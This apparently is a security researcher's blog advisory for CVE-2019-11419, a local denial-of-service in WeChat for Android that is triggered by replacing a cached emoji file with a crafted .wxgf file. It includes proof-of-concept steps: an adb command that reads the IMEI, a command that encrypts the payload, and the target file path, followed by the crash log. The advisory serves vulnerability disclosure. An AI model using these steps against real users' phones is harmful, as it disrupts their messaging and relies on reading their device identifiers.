---
title:  "DoS Wechat with an emoji"
date:   2019-05-14 17:22:33 +0800
categories: Hacking
classes:
  - landing
---

This DoS bug was reported to Tencent, but they decided not to fix because it's not critical. The Common Vulnerabilities and Exposures (CVE) Program has assigned the ID CVE-2019-11419 to this issue. 

## Description:
vcodec2_hls_filter in libvoipCodec_v7a.so in WeChat application for Android results in a DoS by replacing an emoji file (under the /sdcard/tencent/MicroMsg directory) with a crafted .wxgf file.
Crash-log is provided in poc.zip file at https://drive.google.com/open?id=1HFQtbD10awuUicdWoq3dKVKfv0wvxOKS

## Vulnerability Type:
Denial of Service

## Vendor of Product:
Tencent

## Affected Product Code Base:
WeChat for Android - Up to latest version (7.0.3)

## Affected Component:
Function vcodec2_hls_filter in libvoipCodec_v7a.so

## Attack Type:
Local

## Attack vector:
An malware app can crafts a malicious emoji file and overwrites the emoji files under `/sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID]`. Once the user opens any chat messages that contain an emoji, WeChat will instantly crash.

## POC:
Video at https://drive.google.com/open?id=1x1Z3hm4j8f4rhv_WUp4gW-bhdtZMezdU

- User must have sent or received a GIF file in WeChat
- Malware app must retrieve the phone's IMEI. For POC, we can use the below command
```
adb shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print}' ORS=- 
```
- Produce the malicious emoji file with the retrieved IMEI (use encrypt_wxgf.py in poc.zip):
```
python encrypt.py crash4.wxgf [SIZE_OF_EMOJI_ON_SDCARD]
```
- Replace /sdcard/tencent/MicroMsg/[User_ID]/emoji/[WXGF_ID] with the padded out.wxgf.encrypted
- WeChat will crash now if a message that contains the overwritten emoji file

Crash log:
```
Process:            com.tencent.mm
Crash Thread:       27374(total:122)
Date/Time:          2108-12-12 +8.00 13:34:50.135
Live Time:          35s
Device:             Pixel 2 XL android-27
Exception info:    
Siginfo:            errno:0, pid:0, uid:0, process:
after unwind signal thread
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: google/taimen/taimen:8.1.0/OPM4.171019.021.R1/4833808:user/release-keys
pid: 27147, tid: 27374  >>> com.tencent.mm <<<
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000
after dump thread backtrace
  #00  pc 0x0  <unknown> (???)
  #01  pc 0x1f739b  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (vcodec2_hls_filter+546)
  #02  pc 0x1f8efb  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (vcodec2_hls_filters+134)
  #03  pc 0x1efa5d  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (???)
  #04  pc 0x1ea94f  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (v2codec_default_execute+30)
  #05  pc 0x1f1c59  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (???)
  #06  pc 0x1eaa49  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (v2codec_decode_video2+120)
  #07  pc 0x1e375d  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (Vcodec2DecodeMultipleNals+176)
  #08  pc 0x1e510f  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (CWxAMDecoder::decodeColorComponents(unsigned char*, int)+70)
  #09  pc 0x1e5791  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (CWxAMDecoder::add_buffer(unsigned char*, int, int, StWxAMFrame**)+228)
  #10  pc 0x1e5995  /data/data/com.tencent.mm/app_lib/libvoipCodec_v7a.so (wxam_dec_decode_buffer_3+12)
  #11  pc 0x4c435  /data/app/com.tencent.mm-XUPZwNZyUC6RN4utDMIYMw==/lib/arm/libwechatcommon.so (Java_com_tencent_mm_plugin_gif_MMWXGFJNI_nativeDecodeBufferFrame+148)
  ...
```
